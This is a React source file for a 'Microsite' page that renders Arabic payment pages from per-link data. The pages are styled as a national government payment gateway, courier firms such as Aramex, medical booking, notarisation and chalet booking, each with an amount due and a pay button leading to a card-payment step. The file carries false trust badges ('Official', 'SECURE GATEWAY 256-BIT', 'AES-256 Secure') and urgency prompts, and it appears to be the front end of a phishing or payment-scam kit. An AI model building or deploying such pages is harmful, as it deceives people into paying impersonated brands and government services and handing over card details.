import React, { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import SEOHead from "@/components/SEOHead";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";
import {
  MapPin,
  Users,
  CheckCircle2,
  CreditCard,
  Clock,
  Shield,
  Sparkles,
  Package,
  Truck,
  Hash,
  FileText,
  Heart,
  Building2,
  Calendar,
  Lock,
  ArrowLeft,
  Info,
  ChevronRight,
  Landmark,
  ShieldCheck,
  Zap,
  Globe,
  Home,
  Star,
  Scale,
  Gavel,
  PenTool,
  Stamp
} from "lucide-react";

const Microsite = () => {
  const { country, type, id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading, isError } = useLink(id);
  const countryData = getCountryByCode(country || "SA");
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setShowPage(true), 1500);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (link || isError) setShowPage(true);
  }, [link, isError]);
  
  if (isLoading && !showPage) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="flex flex-col items-center gap-4">
          <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          <p className="text-lg font-black text-blue-900 animate-pulse" dir="rtl">جاري تأكيد البيانات...</p>
        </div>
      </div>
    );
  }
  
  if (!link || !countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50" dir="rtl">
        <Card className="p-10 text-center max-w-md border-0 shadow-xl rounded-3xl">
          <Info className="w-16 h-16 mx-auto mb-4 text-gray-400" />
          <h2 className="text-2xl font-black mb-2 text-gray-800">عذراً، الرابط غير صالح</h2>
          <p className="text-gray-500 mb-6 font-bold">الرجاء التأكد من صحة الرابط أو التواصل مع المصدر.</p>
          <Button onClick={() => navigate('/services')} className="w-full h-12 rounded-xl">العودة للرئيسية</Button>
        </Card>
      </div>
    );
  }
  
  const payload = link.payload;
  const serviceKey = payload.service_key || 'aramex';
  const serviceBranding = getServiceBranding(serviceKey);
  const govSystem = getGovernmentPaymentSystem(country || 'SA');

  const handlePayClick = () => {
    const method = payload.payment_method || 'card';
    const company = serviceKey;
    navigate(`/pay/${link.id}/recipient?company=${company}&method=${method}`);
  };

  const renderGovernmentLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
      <header className="flex items-center justify-between mb-8">
        <div className="flex items-center gap-4">
          <div className="w-16 h-16 rounded-2xl bg-white shadow-lg flex items-center justify-center p-3">
             <Landmark className="w-full h-full" style={{ color: govSystem.colors.primary }} />
          </div>
          <div>
            <h1 className="text-2xl font-black text-gray-800">{govSystem.nameAr} | {payload.service_name}</h1>
            <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">{govSystem.nameEn} GATEWAY</p>
          </div>
        </div>
        {govSystem.logo && <img src={govSystem.logo} className="h-12 w-auto object-contain" alt="" />}
      </header>

      <Card className="overflow-hidden border-0 shadow-2xl rounded-[2rem] bg-white">
        <div className="p-10 border-b-2 border-dashed border-gray-100">
           <div className="flex items-center gap-3 mb-6">
             <div className="w-2 h-8 rounded-full" style={{ background: govSystem.colors.primary }} />
             <h2 className="text-xl font-black text-gray-800">تفاصيل الفاتورة الحكومية</h2>
           </div>
           <div className="grid sm:grid-cols-2 gap-8">
             <div><p className="text-xs font-black text-gray-400 uppercase">اسم المستفيد</p><p className="text-lg font-black text-gray-700">{payload.customerInfo?.fullName || payload.customer_name}</p></div>
             <div><p className="text-xs font-black text-gray-400 uppercase">رقم الهوية / المرجع</p><p className="text-lg font-black text-gray-700">{payload.reference || 'N/A'}</p></div>
             <div><p className="text-xs font-black text-gray-400 uppercase">نوع الخدمة</p><Badge className="bg-blue-50 text-blue-700 border-0 font-bold px-4 py-1.5">{payload.service_name}</Badge></div>
             <div><p className="text-xs font-black text-gray-400 uppercase">حالة الدفع</p><div className="flex items-center gap-2 text-amber-600 font-bold"><Clock className="w-4 h-4" /> بانتظار السداد</div></div>
           </div>
        </div>
        <div className="p-10 bg-[#fcfcfc]">
           <div className="bg-white p-8 rounded-3xl border-2 border-gray-50 shadow-sm mb-8 flex flex-col sm:flex-row items-center justify-between gap-6">
             <div><p className="text-sm font-bold text-gray-400 mb-1">المبلغ المطلوب سداده</p><h3 className="text-5xl font-black" style={{ color: govSystem.colors.primary }}>{formatCurrency(payload.payment_amount, payload.currency_code)}</h3></div>
             <div className="text-right"><div className="flex items-center gap-2 px-4 py-2 bg-green-50 text-green-700 rounded-full text-xs font-black mb-2"><ShieldCheck className="w-4 h-4" /> اتصال آمن ومشفر</div></div>
           </div>
           <Button onClick={handlePayClick} className="w-full h-20 text-2xl font-black rounded-2xl shadow-2xl transition-all" style={{ background: govSystem.gradients.primary }}><CreditCard className="w-8 h-8 ml-4" /> سداد الرسوم الآن</Button>
        </div>
      </Card>
    </div>
  );

  const renderShippingLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
       <header className="flex flex-col items-center gap-6 mb-10">
          <div className="w-32 h-32 rounded-[2.5rem] bg-white shadow-2xl flex items-center justify-center p-6 border-4" style={{ borderColor: `${serviceBranding.colors.primary}20` }}>
             <img src={serviceBranding.logo} className="max-h-full max-w-full object-contain" alt="" />
          </div>
          <div className="text-center">
            <h1 className="text-3xl font-black text-gray-800">{payload.service_name}</h1>
            <p className="text-sm font-bold uppercase tracking-[0.3em]" style={{ color: serviceBranding.colors.primary }}>Official Tracking & Payment</p>
          </div>
       </header>
       <div className="grid md:grid-cols-5 gap-8">
          <div className="md:col-span-3">
             <Card className="p-8 border-0 shadow-2xl rounded-[2.5rem] bg-white space-y-6">
                <div className="flex items-center justify-between mb-2">
                   <h2 className="text-xl font-black text-gray-800">بيانات الشحنة</h2>
                   <Badge className="border-0 font-black" style={{ backgroundColor: `${serviceBranding.colors.primary}10`, color: serviceBranding.colors.primary }}>جاهز للتوصيل</Badge>
                </div>
                <div className="p-5 rounded-2xl bg-gray-50 border border-gray-100 flex items-start gap-4">
                   <Hash className="w-6 h-6 text-gray-400 mt-1" />
                   <div><p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">رقم تتبع الشحنة</p><p className="text-xl font-black text-gray-700 font-mono uppercase">{payload.tracking_number}</p></div>
                </div>
                <div className="p-5 rounded-2xl bg-gray-50 border border-gray-100 flex items-start gap-4">
                   <Package className="w-6 h-6 text-gray-400 mt-1" />
                   <div><p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">محتويات الطرد</p><p className="text-lg font-black text-gray-700">{payload.package_description || 'محتويات متنوعة'}</p></div>
                </div>
             </Card>
          </div>
          <div className="md:col-span-2 space-y-6">
             <Card className="p-8 border-0 shadow-2xl rounded-[2.5rem] text-white relative overflow-hidden" style={{ background: serviceBranding.gradients.primary || serviceBranding.colors.primary }}>
                <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 -mr-16 -mt-16 rounded-full" />
                <h2 className="text-lg font-black mb-6">ملخص التكاليف</h2>
                <div className="space-y-4 mb-8">
                   <div className="flex justify-between text-sm opacity-60 font-bold"><span>قيمة المشتريات (COD)</span><span>{formatCurrency(payload.cod_amount, payload.currency_code)}</span></div>
                   <div className="border-t border-white/10 pt-4 flex justify-between items-end">
                      <div><p className="text-[10px] font-black opacity-40 uppercase tracking-widest">الإجمالي المستحق</p><p className="text-4xl font-black">{formatCurrency(payload.cod_amount, payload.currency_code)}</p></div>
                   </div>
                </div>
                <Button onClick={handlePayClick} className="w-full h-16 bg-white hover:bg-gray-100 rounded-2xl font-black text-lg transition-all" style={{ color: serviceBranding.colors.primary }}>دفع وتأكيد الشحن</Button>
             </Card>
          </div>
       </div>
    </div>
  );

  const renderChaletLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
       <header className="text-center mb-10">
          <div className="w-24 h-24 bg-emerald-600 rounded-full mx-auto mb-4 flex items-center justify-center text-white shadow-2xl border-4 border-white">
             <Home className="w-12 h-12" />
          </div>
          <h1 className="text-3xl font-black text-gray-800">{payload.chalet_name}</h1>
          <div className="flex items-center justify-center gap-2 mt-2">
             <MapPin className="w-4 h-4 text-emerald-600" />
             <p className="text-sm font-bold text-gray-400">تأكيد الحجز الفوري</p>
          </div>
       </header>
       <Card className="overflow-hidden border-0 shadow-2xl rounded-[3rem] bg-white">
          <div className="grid md:grid-cols-2">
             <div className="p-10 space-y-8">
                <div className="space-y-1">
                   <h2 className="text-2xl font-black text-gray-800">تفاصيل الإقامة</h2>
                   <p className="text-gray-400 font-bold">مراجعة بيانات حجزك قبل السداد</p>
                </div>
                <div className="grid grid-cols-2 gap-4">
                   <div className="p-4 rounded-2xl bg-gray-50 flex flex-col gap-1">
                      <Calendar className="w-5 h-5 text-emerald-600" />
                      <p className="text-[10px] font-black text-gray-400 uppercase">المدة</p>
                      <p className="font-black text-gray-700">{payload.nights} ليالي</p>
                   </div>
                   <div className="p-4 rounded-2xl bg-gray-50 flex flex-col gap-1">
                      <Users className="w-5 h-5 text-emerald-600" />
                      <p className="text-[10px] font-black text-gray-400 uppercase">الضيوف</p>
                      <p className="font-black text-gray-700">{payload.guest_count} أشخاص</p>
                   </div>
                </div>
                <div className="p-6 rounded-2xl bg-emerald-50 border-2 border-emerald-100">
                   <div className="flex justify-between items-center mb-2"><span className="text-xs font-bold text-emerald-800/60 uppercase">سعر الليلة الواحدة</span><span className="font-black text-emerald-800">{formatCurrency(payload.price_per_night, payload.currency_code)}</span></div>
                   <div className="flex justify-between items-center pt-2 border-t border-emerald-200"><span className="text-sm font-black text-emerald-800">المبلغ الإجمالي</span><span className="text-3xl font-black text-emerald-600">{formatCurrency(payload.total_amount, payload.currency_code)}</span></div>
                </div>
                <Button onClick={handlePayClick} className="w-full h-16 bg-emerald-600 hover:bg-emerald-700 text-white rounded-2xl font-black text-xl shadow-xl shadow-emerald-100 transition-all">تأكيد الحجز والدفع</Button>
             </div>
             <div className="bg-[#10B981] p-10 flex flex-col justify-between text-white relative overflow-hidden">
                <div className="absolute top-0 right-0 w-64 h-64 bg-white/5 -mr-32 -mt-32 rounded-full" />
                <div className="relative z-10 space-y-6">
                   <div className="flex items-center gap-2"><Star className="w-4 h-4 fill-current text-amber-300" /><Star className="w-4 h-4 fill-current text-amber-300" /><Star className="w-4 h-4 fill-current text-amber-300" /><Star className="w-4 h-4 fill-current text-amber-300" /><Star className="w-4 h-4 fill-current text-amber-300" /></div>
                   <h3 className="text-2xl font-black leading-tight">استمتع بإقامة فاخرة وخصوصية تامة</h3>
                   <ul className="space-y-4 text-sm font-bold opacity-80">
                      <li className="flex items-center gap-3"><CheckCircle2 className="w-5 h-5 text-emerald-300" /> مسابح خاصة معقمة</li>
                      <li className="flex items-center gap-3"><CheckCircle2 className="w-5 h-5 text-emerald-300" /> مساحات خضراء واسعة</li>
                      <li className="flex items-center gap-3"><CheckCircle2 className="w-5 h-5 text-emerald-300" /> منطقة ألعاب مجهزة</li>
                   </ul>
                </div>
                <div className="relative z-10 flex items-center gap-3 pt-10 border-t border-white/10">
                   <ShieldCheck className="w-10 h-10 text-emerald-300" />
                   <p className="text-[10px] font-black uppercase tracking-widest opacity-60 font-mono">Guaranteed Booking Protection System</p>
                </div>
             </div>
          </div>
       </Card>
    </div>
  );

  const renderContractsLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
       <header className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-4">
             <div className="w-16 h-16 bg-[#1E3A8A] rounded-2xl flex items-center justify-center text-white shadow-xl shadow-blue-200">
                <Scale className="w-8 h-8" />
             </div>
             <div>
                <h1 className="text-2xl font-black text-gray-800">بوابة التوثيق الموحدة</h1>
                <p className="text-[10px] font-bold text-[#3B82F6] uppercase tracking-[0.3em]">Official Legal Documentation Gateway</p>
             </div>
          </div>
          <Badge className="bg-blue-50 text-blue-700 border-2 border-blue-100 font-black h-8 px-4">موثّق قانونياً</Badge>
       </header>
       <Card className="p-10 border-0 shadow-2xl rounded-[3rem] bg-white relative overflow-hidden">
          <div className="absolute top-0 right-0 w-full h-2 bg-gradient-to-r from-transparent via-[#1E3A8A] to-transparent" />
          <div className="space-y-10">
             <div className="text-center space-y-2">
                <h2 className="text-2xl font-black text-gray-800">مراجعة العقد الإلكتروني</h2>
                <p className="text-gray-400 font-bold">يرجى التحقق من أطراف التعاقد قبل التوثيق</p>
             </div>
             <div className="grid md:grid-cols-2 gap-8">
                <div className="p-6 rounded-3xl bg-gray-50 border-2 border-gray-100 text-center space-y-2">
                   <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">الطرف الأول (المؤجر/البائع)</p>
                   <p className="text-lg font-black text-gray-700">{payload.party_a}</p>
                </div>
                <div className="p-6 rounded-3xl bg-gray-50 border-2 border-gray-100 text-center space-y-2">
                   <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">الطرف الثاني (المستأجر/المشتري)</p>
                   <p className="text-lg font-black text-gray-700">{payload.party_b}</p>
                </div>
             </div>
             <div className="bg-[#fcfcfc] p-8 rounded-3xl border-2 border-dashed border-gray-200 space-y-6">
                <div className="flex justify-between items-center"><div className="flex items-center gap-3"><Gavel className="w-5 h-5 text-blue-600" /><span className="text-sm font-black text-gray-700">نوع النموذج: {payload.template_name}</span></div><span className="text-xs font-bold text-gray-400">بدء السريان: {payload.start_date}</span></div>
                <div className="flex justify-between items-center pt-6 border-t"><div className="space-y-1"><p className="text-[10px] font-black text-gray-400 uppercase">رسوم التوثيق والاعتماد</p><p className="text-4xl font-black text-[#1E3A8A]">{formatCurrency(payload.cod_amount, payload.currency_code)}</p></div><Button onClick={handlePayClick} className="h-16 px-10 bg-[#1E3A8A] hover:bg-[#111827] text-white rounded-2xl font-black text-lg shadow-xl transition-all">توثيق ودفع الآن</Button></div>
             </div>
             <div className="grid grid-cols-3 gap-6 pt-6 border-t border-gray-100">
                <div className="flex flex-col items-center gap-2"><PenTool className="w-6 h-6 text-gray-300" /><span className="text-[8px] font-black text-gray-400 uppercase">Digital Sign</span></div>
                <div className="flex flex-col items-center gap-2"><Stamp className="w-6 h-6 text-gray-300" /><span className="text-[8px] font-black text-gray-400 uppercase">Official Stamp</span></div>
                <div className="flex flex-col items-center gap-2"><Lock className="w-6 h-6 text-gray-300" /><span className="text-[8px] font-black text-gray-400 uppercase">AES-256 Secure</span></div>
             </div>
          </div>
       </Card>
    </div>
  );

  const renderLogisticsLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
       <header className="flex flex-col items-center mb-10">
          <div className="w-20 h-20 bg-blue-600 rounded-[1.5rem] flex items-center justify-center text-white shadow-2xl mb-4 rotate-3"><Truck className="w-10 h-10" /></div>
          <h1 className="text-3xl font-black text-gray-800">الخدمات اللوجستية المتكاملة</h1>
          <p className="text-sm font-bold text-blue-600 uppercase tracking-widest">Supply Chain Solutions Gateway</p>
       </header>
       <Card className="p-10 border-0 shadow-2xl rounded-[3rem] bg-white space-y-10">
          <div className="grid md:grid-cols-2 gap-10">
             <div className="space-y-6">
                <h3 className="text-xl font-black text-gray-800 flex items-center gap-3"><MapPin className="w-5 h-5 text-blue-600" /> مسار الشحنة</h3>
                <div className="relative pr-6 border-r-2 border-dashed border-gray-100 space-y-8">
                   <div className="relative"><div className="absolute -right-[27px] top-1 w-3 h-3 rounded-full bg-blue-600 shadow-[0_0_10px_rgba(37,99,235,0.5)]" /><p className="text-[10px] font-black text-gray-400 uppercase mb-1">المرسل</p><p className="font-black text-gray-700">{payload.sender_name}</p></div>
                   <div className="relative"><div className="absolute -right-[27px] top-1 w-3 h-3 rounded-full bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.5)]" /><p className="text-[10px] font-black text-gray-400 uppercase mb-1">المستلم</p><p className="font-black text-gray-700">{payload.receiver_name}</p></div>
                </div>
             </div>
             <div className="space-y-6">
                <h3 className="text-xl font-black text-gray-800 flex items-center gap-3"><Package className="w-5 h-5 text-blue-600" /> تفاصيل الحمولة</h3>
                <div className="p-6 rounded-3xl bg-gray-50 space-y-4">
                   <div className="flex justify-between items-center text-sm font-bold"><span className="text-gray-400">نوع الشحنة:</span><span className="text-gray-700">{payload.package_type_label}</span></div>
                   <div className="flex justify-between items-center text-sm font-bold"><span className="text-gray-400">حالة الشحن:</span><Badge className="bg-blue-100 text-blue-700 border-0 font-black">بانتظار التحصيل</Badge></div>
                </div>
             </div>
          </div>
          <div className="bg-[#1E293B] p-8 rounded-[2rem] text-white flex flex-col md:flex-row items-center justify-between gap-6 overflow-hidden relative">
             <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 -mr-16 -mt-16 rounded-full" />
             <div><p className="text-[10px] font-black opacity-40 uppercase tracking-widest mb-1">المبلغ الإجمالي المطلوب (COD)</p><p className="text-5xl font-black text-blue-400">{formatCurrency(payload.cod_amount, payload.currency_code)}</p></div>
             <Button onClick={handlePayClick} className="h-16 px-12 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-black text-lg shadow-xl shadow-blue-900/50 transition-all">سداد واستلام الشحنة</Button>
          </div>
       </Card>
    </div>
  );

  const renderHealthLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
       <header className="flex items-center justify-center gap-4 mb-10">
          <Heart className="w-12 h-12 text-red-500 fill-current" />
          <div className="text-right">
             <h1 className="text-3xl font-black text-gray-800">بوابة الحجوزات الطبية</h1>
             <p className="text-sm font-bold text-gray-400">إدارة وتأكيد المواعيد الإلكترونية</p>
          </div>
       </header>
       <Card className="overflow-hidden border-0 shadow-2xl rounded-[3rem] bg-white">
          <div className="bg-red-500 p-8 text-white flex flex-col md:flex-row items-center justify-between gap-6">
             <div className="flex items-center gap-6"><div className="w-20 h-20 bg-white/20 rounded-2xl flex items-center justify-center backdrop-blur-md border border-white/30"><Calendar className="w-10 h-10" /></div><div><p className="text-xs font-black opacity-60 uppercase tracking-widest">تاريخ الموعد المحجوز</p><p className="text-2xl font-black">{payload.appointment_date} | {payload.appointment_time}</p></div></div>
             <div className="bg-white/20 px-6 py-3 rounded-2xl border border-white/30 backdrop-blur-md"><p className="text-[10px] font-black opacity-60 uppercase mb-1">المبلغ المطلوب</p><p className="text-2xl font-black">{formatCurrency(payload.cod_amount, payload.currency_code)}</p></div>
          </div>
          <div className="p-10 grid md:grid-cols-2 gap-10">
             <div className="space-y-6"><h3 className="text-xl font-black text-gray-800 border-r-4 border-red-500 pr-3">بيانات المريض</h3><div className="space-y-4"><div className="p-4 rounded-2xl bg-gray-50 border border-gray-100"><p className="text-[10px] font-black text-gray-400 mb-1 uppercase">الاسم الكامل</p><p className="font-black text-gray-700">{payload.patient_name}</p></div><div className="p-4 rounded-2xl bg-gray-50 border border-gray-100"><p className="text-[10px] font-black text-gray-400 mb-1 uppercase">نوع الخدمة</p><p className="font-black text-gray-700">{payload.service_type_label}</p></div></div></div>
             <div className="space-y-6"><h3 className="text-xl font-black text-gray-800 border-r-4 border-emerald-500 pr-3">حماية الموعد</h3><div className="space-y-4"><p className="text-sm font-bold text-gray-500 leading-relaxed">يتم حجز الموعد مؤقتاً لمدة ساعة واحدة فقط. يرجى إتمام عملية الدفع لتأكيد الحجز النهائي وإصدار رقم المراجعة.</p><Button onClick={handlePayClick} className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-black text-lg shadow-lg text-white">تأكيد ودفع الرسوم</Button></div></div>
          </div>
       </Card>
    </div>
  );

  const renderLocalPaymentLayout = () => (
    <div className="max-w-2xl mx-auto space-y-10 py-10">
       <header className="text-center space-y-4">
          <div className="w-24 h-24 bg-blue-600 rounded-[2rem] mx-auto flex items-center justify-center text-white shadow-2xl rotate-6 group-hover:rotate-0 transition-transform">
             <Zap className="w-12 h-12 fill-current" />
          </div>
          <div>
            <h1 className="text-3xl font-black text-gray-800">بوابة الدفع السريع</h1>
            <p className="text-gray-400 font-bold">نظام تحصيل المدفوعات الفوري المعتمد</p>
          </div>
       </header>
       <Card className="overflow-hidden border-0 shadow-2xl rounded-[3rem] bg-white relative">
          <div className="p-12 text-center space-y-10">
             <div className="space-y-2">
                <p className="text-sm font-black text-gray-400 uppercase tracking-widest">المبلغ المطلوب تحصيله</p>
                <h2 className="text-7xl font-black text-blue-600 tracking-tighter">{formatCurrency(payload.payment_amount, payload.currency_code)}</h2>
             </div>
             <div className="space-y-6">
                <Button onClick={handlePayClick} className="w-full h-24 bg-blue-600 hover:bg-blue-700 text-white rounded-[2rem] text-2xl font-black shadow-2xl shadow-blue-200 transition-all hover:scale-[1.02] active:scale-[0.98]">إتمام عملية الدفع الآمن</Button>
                <div className="flex items-center justify-center gap-8 grayscale opacity-40">
                   <img src="/visa-logo.png" className="h-4" alt="" />
                   <img src="/mastercard-logo.png" className="h-6" alt="" />
                   <img src="/mada-logo.png" className="h-4" alt="" />
                </div>
             </div>
             <div className="pt-10 border-t border-gray-100 flex items-center justify-center gap-6 text-[10px] font-black text-gray-400 uppercase tracking-[0.2em]">
                <div className="flex items-center gap-2"><ShieldCheck className="w-4 h-4 text-green-500" /> Secure</div>
                <div className="flex items-center gap-2"><Globe className="w-4 h-4 text-blue-500" /> Global</div>
                <div className="flex items-center gap-2"><Lock className="w-4 h-4 text-amber-500" /> Private</div>
             </div>
          </div>
       </Card>
    </div>
  );

  return (
    <>
      <SEOHead
        title={`${payload.service_name || payload.chalet_name || 'خدمة دفع'} - ${countryData.nameAr}`}
        description={`إتمام عملية الدفع والتحصيل الرسمية لخدمة ${payload.service_name || payload.chalet_name}`}
        image={serviceBranding.ogImage}
        url={window.location.href}
      />
      <div className="min-h-screen bg-gray-50 pb-20 pt-10 px-4" dir="rtl">
         <div className="container mx-auto">
            <div className="mb-6 flex items-center justify-between">
               <BackButton />
               <div className="flex items-center gap-2 text-xs font-black text-gray-400 uppercase tracking-widest bg-white px-4 py-2 rounded-full shadow-sm border border-gray-100">
                  <Lock className="w-3.5 h-3.5" /> SECURE GATEWAY 256-BIT
               </div>
            </div>

            {link.type === 'government' ? renderGovernmentLayout() :
             link.type === 'shipping' ? renderShippingLayout() :
             link.type === 'health' ? renderHealthLayout() :
             link.type === 'chalet' ? renderChaletLayout() :
             link.type === 'contracts' ? renderContractsLayout() :
             link.type === 'logistics' ? renderLogisticsLayout() :
             link.type === 'payment' ? renderLocalPaymentLayout() :
             <div className="max-w-4xl mx-auto space-y-6">
                <header className="text-center mb-10">
                   <div className="w-20 h-20 bg-blue-600 rounded-3xl mx-auto mb-4 flex items-center justify-center text-white shadow-xl rotate-3"><CreditCard className="w-10 h-10" /></div>
                   <h1 className="text-3xl font-black text-gray-800">بوابة الدفع الموحدة</h1>
                   <p className="text-sm font-bold text-gray-400">آمن • سريع • موثوق</p>
                </header>
                <Card className="overflow-hidden border-0 shadow-2xl rounded-[3rem] bg-white p-10 text-center">
                   <p className="text-sm font-bold text-gray-400 mb-2">المبلغ المطلوب</p>
                   <h3 className="text-6xl font-black text-blue-600 mb-10 tracking-tighter">{formatCurrency(payload.payment_amount || payload.cod_amount || payload.total_amount, payload.currency_code)}</h3>
                   <Button onClick={handlePayClick} className="w-full h-20 bg-blue-600 hover:bg-blue-700 rounded-2xl font-black text-2xl shadow-2xl shadow-blue-200 transition-all">متابعة الدفع الآن</Button>
                </Card>
             </div>
            }
         </div>
      </div>
      <BottomNav />
    </>
  );
};

export default Microsite;
